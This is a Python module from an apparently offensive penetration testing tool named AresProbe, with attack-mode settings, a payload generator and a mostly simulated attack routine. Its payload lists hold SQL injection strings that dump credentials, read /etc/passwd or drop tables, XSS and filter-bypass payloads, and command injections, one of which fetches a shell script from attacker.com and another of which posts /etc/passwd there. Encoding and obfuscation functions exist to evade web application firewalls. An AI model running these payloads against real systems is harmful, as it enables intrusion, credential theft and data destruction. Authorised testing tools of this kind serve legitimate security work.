"""
AresProbe Aggressive Configuration System
Advanced penetration testing and aggressive injection techniques
"""

import os
import json
import yaml
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import random
import string

from .logger import Logger


class AttackMode(Enum):
    """Attack modes for aggressive testing"""
    STEALTH = "stealth"          # Silent, undetected
    AGGRESSIVE = "aggressive"    # Fast, multiple payloads
    BRUTEFORCE = "bruteforce"    # Maximum payloads, high speed
    PERSISTENT = "persistent"    # Long-term, sustained attacks
    DESTRUCTIVE = "destructive"  # High-risk, potentially damaging


class InjectionTechnique(Enum):
    """Advanced injection techniques"""
    UNION_BASED = "union_based"
    ERROR_BASED = "error_based"
    BOOLEAN_BLIND = "boolean_blind"
    TIME_BASED = "time_based"
    STACKED_QUERIES = "stacked_queries"
    OUT_OF_BAND = "out_of_band"
    SECOND_ORDER = "second_order"
    POLYGLOT = "polyglot"
    WAF_BYPASS = "waf_bypass"
    ENCODING_BYPASS = "encoding_bypass"


@dataclass
class AggressiveConfig:
    """Configuration for aggressive penetration testing"""
    
    # Attack Mode
    attack_mode: AttackMode = AttackMode.AGGRESSIVE
    
    # Injection Settings
    injection_techniques: List[InjectionTechnique] = None
    max_payloads_per_technique: int = 100
    payload_encoding: List[str] = None
    bypass_techniques: List[str] = None
    
    # Timing and Speed
    request_delay: float = 0.1
    max_concurrent_requests: int = 50
    timeout: int = 30
    retry_attempts: int = 3
    
    # Evasion Settings
    user_agents: List[str] = None
    proxy_rotation: bool = True
    ip_rotation: bool = False
    header_manipulation: bool = True
    
    # Advanced Techniques
    second_order_injection: bool = True
    polyglot_payloads: bool = True
    waf_bypass: bool = True
    encoding_bypass: bool = True
    obfuscation: bool = True
    
    # Data Extraction
    extract_databases: bool = True
    extract_tables: bool = True
    extract_columns: bool = True
    extract_data: bool = True
    max_data_rows: int = 1000
    
    # Destructive Operations
    allow_destructive: bool = False
    test_drop_tables: bool = False
    test_insert_data: bool = False
    test_update_data: bool = False
    
    def __post_init__(self):
        if self.injection_techniques is None:
            self.injection_techniques = [
                InjectionTechnique.UNION_BASED,
                InjectionTechnique.ERROR_BASED,
                InjectionTechnique.BOOLEAN_BLIND,
                InjectionTechnique.TIME_BASED,
                InjectionTechnique.STACKED_QUERIES,
                InjectionTechnique.WAF_BYPASS,
                InjectionTechnique.ENCODING_BYPASS
            ]
        
        if self.payload_encoding is None:
            self.payload_encoding = [
                'url', 'double_url', 'html', 'unicode', 'hex', 'base64',
                'utf8', 'utf16', 'ascii', 'binary'
            ]
        
        if self.bypass_techniques is None:
            self.bypass_techniques = [
                'comment_bypass', 'case_variation', 'whitespace_bypass',
                'function_bypass', 'operator_bypass', 'keyword_bypass',
                'encoding_bypass', 'time_delay_bypass', 'chunked_bypass'
            ]
        
        if self.user_agents is None:
            self.user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101'
            ]


class AggressivePayloadGenerator:
    """Advanced payload generator for aggressive testing"""
    
    def __init__(self, config: AggressiveConfig, logger: Logger = None):
        self.config = config
        self.logger = logger or Logger()
        self.payload_templates = self._load_aggressive_payloads()
    
    def _load_aggressive_payloads(self) -> Dict[str, List[str]]:
        """Load aggressive payload templates"""
        return {
            'sql_injection': {
                'union_based': [
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION ALL SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION SELECT version(),user(),database()--",
                    "' UNION SELECT table_name,column_name,data_type FROM information_schema.columns--",
                    "' UNION SELECT CONCAT(user,':',password) FROM mysql.user--",
                    "' UNION SELECT LOAD_FILE('/etc/passwd')--",
                    "' UNION SELECT @@version,@@datadir,@@hostname--"
                ],
                'error_based': [
                    "' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(COUNT(*) AS CHAR),0x7e,version(),0x7e)) FROM information_schema.tables WHERE table_schema=DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(COUNT(*) AS CHAR),0x7e,user(),0x7e)) FROM information_schema.tables WHERE table_schema=DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
                ],
                'boolean_blind': [
                    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.columns) > 0--",
                    "' AND (SELECT COUNT(*) FROM mysql.user) > 0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > 0--",
                    "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0--",
                    "' AND (SELECT LENGTH(version())) > 0--",
                    "' AND (SELECT LENGTH(user())) > 0--",
                    "' AND (SELECT LENGTH(database())) > 0--"
                ],
                'time_based': [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "' AND pg_sleep(5)--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND SLEEP(5))--",
                    "' AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)--",
                    "' AND (SELECT SLEEP(5) FROM mysql.user LIMIT 1)--"
                ],
                'stacked_queries': [
                    "'; DROP TABLE IF EXISTS test_table--",
                    "'; CREATE TABLE test_table (id INT)--",
                    "'; INSERT INTO test_table VALUES (1)--",
                    "'; UPDATE test_table SET id=2--",
                    "'; DELETE FROM test_table--",
                    "'; ALTER TABLE test_table ADD COLUMN name VARCHAR(255)--"
                ],
                'waf_bypass': [
                    "'/**/UNION/**/SELECT/**/NULL--",
                    "'/*!50000UNION*//*!50000SELECT*/NULL--",
                    "'%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c--",
                    "'UNI%0aON SEL%0aECT NULL--",
                    "'UNION%0d%0aSELECT%0d%0aNULL--",
                    "'UNION%09SELECT%09NULL--",
                    "'UNION%0cSELECT%0cNULL--"
                ],
                'encoding_bypass': [
                    "'%27%20UNION%20SELECT%20NULL--",
                    "'%2527%2520UNION%2520SELECT%2520NULL--",
                    "'%252527%252520UNION%252520SELECT%252520NULL--",
                    "'%u0027%u0020UNION%u0020SELECT%u0020NULL--",
                    "'%c0%a7%c0%a0UNION%c0%a0SELECT%c0%a0NULL--"
                ]
            },
            'xss': {
                'basic': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<iframe src=javascript:alert('XSS')>"
                ],
                'advanced': [
                    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
                    "<script>setTimeout('alert(\\'XSS\\')',0)</script>",
                    "<img src=x onerror=setTimeout('alert(\\'XSS\\')',0)>"
                ],
                'waf_bypass': [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
                    "<svg onload=alert(String.fromCharCode(88,83,83))>",
                    "<script>alert`XSS`</script>",
                    "<img src=x onerror=alert`XSS`>"
                ]
            },
            'command_injection': {
                'basic': [
                    "; ls -la",
                    "| whoami",
                    "& id",
                    "` cat /etc/passwd `",
                    "$(whoami)"
                ],
                'advanced': [
                    "; cat /etc/passwd | grep root",
                    "| cat /etc/shadow",
                    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "` wget http://attacker.com/shell.sh -O /tmp/shell.sh `",
                    "$(curl http://attacker.com/data -d \"$(cat /etc/passwd)\")"
                ],
                'waf_bypass': [
                    r"; l\s -l\a",
                    r"| w\h\o\a\m\i",
                    r"& i\d",
                    r"` c\a\t /etc/passwd `",
                    r"$(w\h\o\a\m\i)"
                ]
            }
        }
    
    def generate_aggressive_payloads(self, vuln_type: str, technique: str = None) -> List[str]:
        """Generate aggressive payloads for specific vulnerability type"""
        payloads = []
        
        if vuln_type not in self.payload_templates:
            return payloads
        
        vuln_payloads = self.payload_templates[vuln_type]
        
        if technique and technique in vuln_payloads:
            # Generate payloads for specific technique
            base_payloads = vuln_payloads[technique]
            for payload in base_payloads:
                payloads.extend(self._apply_aggressive_modifications(payload))
        else:
            # Generate payloads for all techniques
            for tech, tech_payloads in vuln_payloads.items():
                for payload in tech_payloads:
                    payloads.extend(self._apply_aggressive_modifications(payload))
        
        # Limit payloads based on configuration
        max_payloads = self.config.max_payloads_per_technique
        return payloads[:max_payloads]
    
    def _apply_aggressive_modifications(self, payload: str) -> List[str]:
        """Apply aggressive modifications to payloads"""
        modified_payloads = [payload]
        
        # Apply encoding bypasses
        if self.config.encoding_bypass:
            for encoding in self.config.payload_encoding:
                encoded = self._apply_encoding(payload, encoding)
                if encoded != payload:
                    modified_payloads.append(encoded)
        
        # Apply WAF bypasses
        if self.config.waf_bypass:
            for bypass in self.config.bypass_techniques:
                bypassed = self._apply_bypass(payload, bypass)
                if bypassed != payload:
                    modified_payloads.append(bypassed)
        
        # Apply obfuscation
        if self.config.obfuscation:
            obfuscated = self._apply_obfuscation(payload)
            if obfuscated != payload:
                modified_payloads.append(obfuscated)
        
        return list(set(modified_payloads))  # Remove duplicates
    
    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Apply specific encoding to payload"""
        if encoding == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            import urllib.parse
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'html':
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'hex':
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif encoding == 'base64':
            import base64
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def _apply_bypass(self, payload: str, bypass: str) -> str:
        """Apply specific bypass technique"""
        if bypass == 'comment_bypass':
            return payload.replace(' ', '/**/')
        elif bypass == 'case_variation':
            return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        elif bypass == 'whitespace_bypass':
            return payload.replace(' ', '\t').replace(' ', '\n').replace(' ', '\r')
        elif bypass == 'function_bypass':
            return payload.replace('SELECT', 'SEL/*ECT*/').replace('UNION', 'UNI/*ON*/')
        elif bypass == 'operator_bypass':
            return payload.replace('=', 'LIKE').replace('>', 'GREATER THAN')
        elif bypass == 'keyword_bypass':
            return payload.replace('SELECT', 'SELSELECTECT').replace('UNION', 'UNUNIONION')
        else:
            return payload
    
    def _apply_obfuscation(self, payload: str) -> str:
        """Apply obfuscation techniques"""
        # Add random comments
        if 'SELECT' in payload.upper():
            payload = payload.replace('SELECT', 'SEL/*RANDOM*/ECT')
        if 'UNION' in payload.upper():
            payload = payload.replace('UNION', 'UNI/*RANDOM*/ON')
        
        # Add random whitespace
        payload = payload.replace(' ', '  ')
        
        return payload


class PenetrationMode:
    """Advanced penetration testing mode"""
    
    def __init__(self, config: AggressiveConfig, logger: Logger = None):
        self.config = config
        self.logger = logger or Logger()
        self.payload_generator = AggressivePayloadGenerator(config, logger)
        self.attack_vectors = self._load_attack_vectors()
    
    def _load_attack_vectors(self) -> Dict[str, List[str]]:
        """Load advanced attack vectors"""
        return {
            'sql_injection': [
                'parameter_injection',
                'header_injection',
                'cookie_injection',
                'user_agent_injection',
                'referer_injection',
                'second_order_injection',
                'blind_injection',
                'time_based_injection'
            ],
            'xss': [
                'reflected_xss',
                'stored_xss',
                'dom_xss',
                'blind_xss',
                'self_xss',
                'mutation_xss'
            ],
            'command_injection': [
                'os_command_injection',
                'ldap_injection',
                'xpath_injection',
                'code_injection',
                'template_injection'
            ]
        }
    
    def execute_penetration_test(self, target: str, attack_type: str) -> Dict[str, Any]:
        """Execute comprehensive penetration test"""
        results = {
            'target': target,
            'attack_type': attack_type,
            'vulnerabilities': [],
            'exploits': [],
            'data_extracted': {},
            'success': False
        }
        
        try:
            self.logger.info(f"[*] Starting penetration test on {target}")
            
            # Execute attack vectors
            for vector in self.attack_vectors.get(attack_type, []):
                vector_results = self._execute_attack_vector(target, attack_type, vector)
                results['vulnerabilities'].extend(vector_results.get('vulnerabilities', []))
                results['exploits'].extend(vector_results.get('exploits', []))
            
            # Extract data if vulnerabilities found
            if results['vulnerabilities']:
                results['data_extracted'] = self._extract_sensitive_data(target, attack_type)
                results['success'] = True
            
            self.logger.success(f"[+] Penetration test completed: {len(results['vulnerabilities'])} vulnerabilities found")
            
        except Exception as e:
            self.logger.error(f"[-] Penetration test failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _execute_attack_vector(self, target: str, attack_type: str, vector: str) -> Dict[str, Any]:
        """Execute specific attack vector"""
        results = {
            'vector': vector,
            'vulnerabilities': [],
            'exploits': []
        }
        
        try:
            # Generate payloads for this vector
            payloads = self.payload_generator.generate_aggressive_payloads(attack_type)
            
            # Execute payloads (simplified for example)
            for payload in payloads[:10]:  # Limit for demo
                # Simulate vulnerability detection
                if self._simulate_vulnerability_detection(target, payload):
                    vulnerability = {
                        'type': attack_type,
                        'vector': vector,
                        'payload': payload,
                        'severity': 'high',
                        'confidence': 0.9
                    }
                    results['vulnerabilities'].append(vulnerability)
                    
                    # Generate exploit
                    exploit = self._generate_exploit(target, payload, attack_type)
                    if exploit:
                        results['exploits'].append(exploit)
        
        except Exception as e:
            self.logger.error(f"[-] Error executing attack vector {vector}: {e}")
        
        return results
    
    def _simulate_vulnerability_detection(self, target: str, payload: str) -> bool:
        """Simulate vulnerability detection (replace with actual implementation)"""
        # This is a simplified simulation
        # In real implementation, this would make actual HTTP requests
        return random.choice([True, False, False, False])  # 25% chance for demo
    
    def _generate_exploit(self, target: str, payload: str, attack_type: str) -> Dict[str, Any]:
        """Generate exploit for detected vulnerability"""
        exploit = {
            'target': target,
            'type': attack_type,
            'payload': payload,
            'description': f'Exploit for {attack_type} vulnerability',
            'risk_level': 'high',
            'steps': [
                f'1. Identify vulnerable parameter in {target}',
                f'2. Inject payload: {payload}',
                '3. Verify vulnerability exploitation',
                '4. Extract sensitive data',
                '5. Maintain access if possible'
            ]
        }
        return exploit
    
    def _extract_sensitive_data(self, target: str, attack_type: str) -> Dict[str, Any]:
        """Extract sensitive data from compromised target"""
        if not self.config.extract_data:
            return {}
        
        extracted_data = {
            'databases': [],
            'tables': [],
            'columns': [],
            'data': []
        }
        
        if attack_type == 'sql_injection':
            # Simulate data extraction
            extracted_data['databases'] = ['information_schema', 'mysql', 'test']
            extracted_data['tables'] = ['users', 'admin', 'config']
            extracted_data['columns'] = ['id', 'username', 'password', 'email']
            extracted_data['data'] = [
                {'id': 1, 'username': 'admin', 'password': 'hash123', 'email': 'admin@example.com'},
                {'id': 2, 'username': 'user', 'password': 'hash456', 'email': 'user@example.com'}
            ]
        
        return extracted_data


class AggressiveConfigManager:
    """Manager for aggressive configuration settings"""
    
    def __init__(self, logger: Logger = None):
        self.logger = logger or Logger()
        self.config_file = "aggressive_config.json"
        self.config = AggressiveConfig()
    
    def load_config(self, config_file: str = None) -> AggressiveConfig:
        """Load configuration from file"""
        if config_file:
            self.config_file = config_file
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    if self.config_file.endswith('.yaml') or self.config_file.endswith('.yml'):
                        config_data = yaml.safe_load(f)
                    else:
                        config_data = json.load(f)
                
                # Update configuration
                self._update_config_from_data(config_data)
                self.logger.success(f"[+] Configuration loaded from {self.config_file}")
            else:
                self.logger.info(f"[*] Configuration file not found, using defaults")
                
        except Exception as e:
            self.logger.error(f"[-] Error loading configuration: {e}")
        
        return self.config
    
    def save_config(self, config_file: str = None) -> bool:
        """Save configuration to file"""
        if config_file:
            self.config_file = config_file
        
        try:
            config_data = asdict(self.config)
            
            with open(self.config_file, 'w', encoding='utf-8') as f:
                if self.config_file.endswith('.yaml') or self.config_file.endswith('.yml'):
                    yaml.dump(config_data, f, default_flow_style=False)
                else:
                    json.dump(config_data, f, indent=2, default=str)
            
            self.logger.success(f"[+] Configuration saved to {self.config_file}")
            return True
            
        except Exception as e:
            self.logger.error(f"[-] Error saving configuration: {e}")
            return False
    
    def _update_config_from_data(self, data: Dict[str, Any]):
        """Update configuration from loaded data"""
        for key, value in data.items():
            if hasattr(self.config, key):
                if key == 'attack_mode' and isinstance(value, str):
                    setattr(self.config, key, AttackMode(value))
                elif key == 'injection_techniques' and isinstance(value, list):
                    techniques = [InjectionTechnique(t) for t in value if t in [e.value for e in InjectionTechnique]]
                    setattr(self.config, key, techniques)
                else:
                    setattr(self.config, key, value)
    
    def set_attack_mode(self, mode: AttackMode):
        """Set attack mode"""
        self.config.attack_mode = mode
        self.logger.info(f"[*] Attack mode set to: {mode.value}")
    
    def enable_destructive_mode(self):
        """Enable destructive testing mode"""
        self.config.allow_destructive = True
        self.config.test_drop_tables = True
        self.config.test_insert_data = True
        self.config.test_update_data = True
        self.logger.warning("[!] DESTRUCTIVE MODE ENABLED - Use with extreme caution!")
    
    def disable_destructive_mode(self):
        """Disable destructive testing mode"""
        self.config.allow_destructive = False
        self.config.test_drop_tables = False
        self.config.test_insert_data = False
        self.config.test_update_data = False
        self.logger.info("[*] Destructive mode disabled")
    
    def get_config_summary(self) -> Dict[str, Any]:
        """Get configuration summary"""
        return {
            'attack_mode': self.config.attack_mode.value,
            'injection_techniques': [t.value for t in self.config.injection_techniques],
            'max_payloads': self.config.max_payloads_per_technique,
            'destructive_mode': self.config.allow_destructive,
            'concurrent_requests': self.config.max_concurrent_requests,
            'timeout': self.config.timeout
        }
